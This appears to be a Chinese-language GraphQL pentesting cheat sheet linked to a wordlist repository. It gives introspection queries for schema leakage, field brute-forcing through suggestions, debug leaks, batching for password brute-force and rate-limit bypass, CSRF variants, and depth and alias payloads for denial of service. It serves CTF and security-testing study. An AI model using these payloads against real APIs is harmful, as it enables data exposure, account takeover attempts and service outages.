---
title: "https://github.com/Escape-Technologies/graphql-wordlist"
description: "
GraphQL

資訊洩漏

基本查詢

查詢存在的類型:

{ __schema { types { name } } }
{__schema{types{name,fields{name}}}}


查詢一個類型所有字段:

{ __type (name: \"Query\") { name fields { name type { name kind ofType { name kind } } } } }
{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}

提取所有類型、他的字段、參數以及參數類型


可以觀察一些敏感字段，如: password, email, token, session, secretkey, ... 等


透過 Introspection 來撈 schema:

fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}




Suggestion

當輸入一個未知的keyword，Graphql backend 會建議正確的keyword

\"message\": \"Cannot query field \\"one\\" on type \\"Query\\". Did you mean \\"node\\"?\",


透過字典檔去brute-force






錯誤訊息

可以透過錯誤訊息取得有用資訊
{__schema}
{}
{somerandomshit}


Graphene-Django DEBUG

透過添加 __debug 來取得詳細資訊，例如 sql 執行語句




Batch query

可以透過 Array-based query 一次送好幾個請求
Apollo GraphQL 預設不啟用 Array Batching
常見情境：Password brute-force, Rate limit bypass, DoS
[{ query: 'query { book(id: 1) { __typename } }' },{ query: 'query { book(id: 1) { __typename } }' }]
JSON list based batching 不能用時，可以嘗試 Query name based batching

{\"query\": \"query { kaibro: Query { meow } kaibro1: Query { meow } }\"}


Example:

Line CTF 2024 - graphql-101
corCTF 2023 - force




CSRF

GET-based

/graphql?query=query+%7B+a+%7D


POST-based

content-type 改 x-www-form-urlencoded 仍可執行
Example: Express-GraphQL, Portswigger's lab




Query Depth Attack

未阻擋的話，容易造成DoS
Example: query { books { title author { title books { title author { ... } } } } }


Alias overloading

Example: query { book(id: 1) { __typename alias: __typename alias2: __typename alias3: __typename alias4: __typename } }


Tool

graphw00f (fingerprinting)
graphquail
GraphQLmap
...


Example:

Line CTF 2023 - Momomomomemomemo
VolgaCTF 2020 - library
HITCON 2018 - BabyQuery



"
url: "https://github.com/Escape-Technologies/graphql-wordlist"
category: "Grey Hat Tools"
---
